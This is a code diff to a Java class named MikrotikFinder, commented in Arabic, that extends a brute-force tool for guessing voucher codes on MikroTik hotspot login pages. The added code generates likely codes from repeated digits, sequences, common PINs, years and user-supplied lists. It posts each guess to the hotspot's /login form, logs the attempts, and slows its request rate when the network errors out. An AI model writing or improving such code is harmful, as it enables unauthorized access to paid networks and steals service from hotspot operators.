@@ -41,6 +41,11 @@ public class MikrotikFinder {
     private final AtomicBoolean running = new AtomicBoolean(false);
     private final java.util.Set<String> triedInSession = java.util.Collections.synchronizedSet(new java.util.HashSet<>());
     private final AtomicLong totalAttempts = new AtomicLong(0);
+    private final java.util.List<String> customSequences;
+    private int customIndex = 0;
+    private final java.util.List<String> smartPatterns = new java.util.ArrayList<>();
+    private int smartIndex = 0;
+    private final java.util.concurrent.atomic.AtomicInteger recentErrors = new java.util.concurrent.atomic.AtomicInteger(0);
     private final java.util.List<String> candidates = java.util.Collections.synchronizedList(new java.util.ArrayList<>());
     private final java.util.Map<String, String> candidateDetails = new java.util.concurrent.ConcurrentHashMap<>();
     private volatile long firstCandidateTime = 0;
@@ -56,7 +61,8 @@ public class MikrotikFinder {
     public MikrotikFinder(String rawUrl, String networkName,
                           String prefix, String middle, String suffix,
                           int varDigits, int maxAttempts, int waitMs, int parallel,
-                          boolean relax, GuessDatabase db) {
+                          boolean relax, GuessDatabase db,
+                          java.util.List<String> customSeqs) {
         this.rawUrl = cleanUrl(convertArabicNumerals(rawUrl));
         String calcBase;
         try {
@@ -80,6 +86,10 @@ public class MikrotikFinder {
         this.parallel = Math.max(1, Math.min(20, parallel));
         this.relax = relax;
         this.db = db;
+        this.customSequences = new java.util.ArrayList<>();
+        if (customSeqs != null) this.customSequences.addAll(customSeqs);
+        // 🧠 توليد أنماط التخمين الذكي
+        initSmartPatterns();
         // 🧠 منطق عدم التكرار الذكي
         try {
             String savedPrefix = db.getConfig("prefix");
@@ -146,6 +156,35 @@ public class MikrotikFinder {
         }
     }
 
+    private void initSmartPatterns() {
+        int d = varDigits;
+        // 1. أرقام متكررة (0000, 1111, ..., 9999)
+        for (char ch = '0'; ch <= '9'; ch++) {
+            StringBuilder sb = new StringBuilder();
+            for (int i = 0; i < d; i++) sb.append(ch);
+            smartPatterns.add(sb.toString());
+        }
+        // 2. تسلسل تصاعدي (0123, 1234, ...)
+        StringBuilder seq = new StringBuilder();
+        for (int i = 0; i < d; i++) seq.append((i + 1) % 10);
+        smartPatterns.add(seq.toString());
+        // 3. تسلسل تنازلي
+        StringBuilder rev = new StringBuilder();
+        for (int i = 0; i < d; i++) rev.append((9 - i) % 10);
+        smartPatterns.add(rev.toString());
+        // 4. أنماط شائعة
+        String[] common = {"0000", "1111", "1234", "4321", "2580", "1212", "1313", "2024", "2023", "2025"};
+        for (String cs : common) {
+            if (cs.length() >= d) smartPatterns.add(cs.substring(0, d));
+            else smartPatterns.add(cs);
+        }
+        // 5. سنوات (1990-2025)
+        for (int yr = 1990; yr <= 2025; yr++) {
+            String s = String.valueOf(yr);
+            if (s.length() >= d) smartPatterns.add(s.substring(s.length() - d));
+        }
+    }
+
     private void fail(String msg) {
         running.set(false);
         if (listener != null) uiHandler.post(() -> listener.onError(msg));
@@ -175,6 +214,13 @@ public class MikrotikFinder {
                 }
                 try {
                     long sleep = relax ? (600 + (long)(Math.random() * 800)) : (waitMs / 2 + (long)(Math.random() * waitMs));
+                    // 🌐 تكييف مع الشبكة الضعيفة
+                    int errs = recentErrors.get();
+                    if (errs > 5) {
+                        sleep *= 3; // بطيء جداً
+                    } else if (errs > 2) {
+                        sleep *= 2; // بطيء
+                    }
                     Thread.sleep(sleep);
                 } catch (InterruptedException e) { break; }
             }
@@ -197,6 +243,11 @@ public class MikrotikFinder {
         String body = buildFormBody(formTemplate, voucher);
         String postResp = httpPost(base + "/login", body, session, 6000);
         totalAttempts.incrementAndGet();
+        if (postResp == null) {
+            recentErrors.incrementAndGet();
+        } else {
+            recentErrors.set(0);
+        }
 
         // 🏷️ تصنيف الحالات
         if (postResp != null) {
@@ -360,21 +411,62 @@ public class MikrotikFinder {
     }
 
     private String generateVoucher() {
+        // 🎯 1. الأرقام المخصصة أولاً
+        if (customSequences != null && customIndex < customSequences.size()) {
+            String seq = customSequences.get(customIndex++);
+            // إذا كان الطول لا يطابق، نعدل
+            if (seq.length() < varDigits) {
+                StringBuilder sb = new StringBuilder(seq);
+                while (sb.length() < varDigits) sb.append('0');
+                seq = sb.toString();
+            } else if (seq.length() > varDigits) {
+                seq = seq.substring(0, varDigits);
+            }
+            String v = buildVoucherWithVar(seq);
+            if (!triedInSession.contains(seq)) {
+                triedInSession.add(seq);
+                db.addAttemptWithStatus(v, "pending", null);
+                return v;
+            }
+        }
+        
+        // 🧠 2. الأنماط الذكية
+        while (smartIndex < smartPatterns.size()) {
+            String seq = smartPatterns.get(smartIndex++);
+            if (seq.length() != varDigits) continue;
+            if (triedInSession.contains(seq)) continue;
+            String v = buildVoucherWithVar(seq);
+            if (varDigits >= 4 && db.existsVarPart(prefix + seq)) continue;
+            triedInSession.add(seq);
+            db.addAttemptWithStatus(v, "pending", null);
+            return v;
+        }
+        
+        // 🎲 3. عشوائي (الوضع الافتراضي)
         long max = (long) Math.pow(10, Math.min(varDigits, 12));
         int maxTries = varDigits >= 4 ? 3000 : 200;
         for (int i = 0; i < maxTries; i++) {
             long num = (long)(Math.random() * max);
-            // varPart = البادئة + المتغيرة (بدون اللاحقة)
-            String varPart = prefix + pad(num, varDigits);
-            String v = varPart + middle + suffix;
-            if (triedInSession.contains(varPart)) continue;
-            // للأرقام 4+، تجاهل الأرقام المتغيرة المجربة سابقاً (بغض النظر عن اللاحقة)
+            String seq = pad(num, varDigits);
+            String varPart = prefix + seq;
+            if (triedInSession.contains(seq)) continue;
             if (varDigits >= 4 && db.existsVarPart(varPart)) continue;
-            triedInSession.add(varPart);
+            triedInSession.add(seq);
+            String v = buildVoucherWithVar(seq);
             db.addAttemptFull(v, varPart, "pending", null);
             return v;
         }
         return null;
+    }
+
+    // 🔧 منتصف الأرقام في المنتصف
+    private String buildVoucherWithVar(String varStr) {
+        if (varStr.length() != varDigits) varStr = pad(0, varDigits);
+        int half1 = varDigits / 2;
+        int half2 = varDigits - half1;
+        String part1 = varStr.substring(0, half1);
+        String part2 = varStr.substring(half1);
+        return prefix + part1 + middle + part2 + suffix;
     }
 
     private String buildFormBody(Map<String, String> fields, String voucher) {
